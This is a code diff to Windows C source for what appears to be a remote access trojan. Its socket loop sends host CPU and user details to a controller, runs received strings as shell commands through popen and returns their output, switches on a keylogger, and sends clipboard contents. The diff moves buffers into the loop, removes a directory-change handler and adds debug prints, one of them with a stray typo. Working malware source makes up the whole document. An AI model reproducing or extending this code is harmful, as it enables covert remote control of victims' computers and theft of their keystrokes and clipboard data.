@@ -15,10 +15,6 @@ void start_sockets();
 
 SOCKET sock;
 
-char buffer[1024];
-char response[1024];
-char message[20000];
-
 void talk(struct addrinfo* client) {
     char cpuBuffer[1024];
     print_cpu_details(cpuBuffer);
@@ -33,13 +29,15 @@ void talk(struct addrinfo* client) {
     printf("%s\n", userBuffer);
     send(sock, userBuffer, sizeof(userBuffer), 0);
 
-    // char diskBuffer[1024];
-    // print_disk_space(diskBuffer);
-    // send(sock, diskBuffer, sizeof(diskBuffer), 0);
-
     while (1) {
+
+        char message[20000];
+        char response[1024];
+        char buffer[1024];
+
         ZeroMemory(buffer, sizeof(buffer));
         ZeroMemory(response, sizeof(response));
+        ZeroMemory(message, sizeof(message));
 
         int recvBytes = recv(sock, buffer, sizeof(buffer), 0);
 
@@ -49,11 +47,6 @@ void talk(struct addrinfo* client) {
             closesocket(sock);
             WSACleanup();
             start_sockets();
-        } else if (buffer[0] == 'c' && buffer[1] == 'd') {
-            char* cdBuffer = buffer;
-            SetCurrentDirectory(cdBuffer + 3);
-            sprintf(message, "Current Directory: %s", cdBuffer + 3);
-            send(sock, message, sizeof(message), 0);
         } else if (buffer[0] == 'k' && buffer[1] == 'l') {
             printf("keylogging on server\n");
             change_active(1);
@@ -72,16 +65,15 @@ void talk(struct addrinfo* client) {
                 continue;
             }
 
-            ZeroMemory(message, sizeof(message));
+            // ZeroMemory(message, (message));
 
             sprintf(message, "Current Clipboard: %s", clip);
             CloseClipboard();
             send(sock, message, sizeof(message), 0);
         } else {
             FILE* file = popen(buffer, "r");
-            printf("%d\n", strcmp(buffer, "restart"));
             if (strcmp(buffer, "restart") == 0) {
-                printf("Client Disconnected\n");
+                printf("Client Disconnectedsizeof\n");
                 freeaddrinfo(client);
                 closesocket(sock);
                 WSACleanup();
@@ -91,6 +83,9 @@ void talk(struct addrinfo* client) {
             while (fgets(response, sizeof(response), file)) {
                 strcat(message, response);
             }
+
+            printf(".\n");
+
             send(sock, message, sizeof(message), 0);
         }
     }
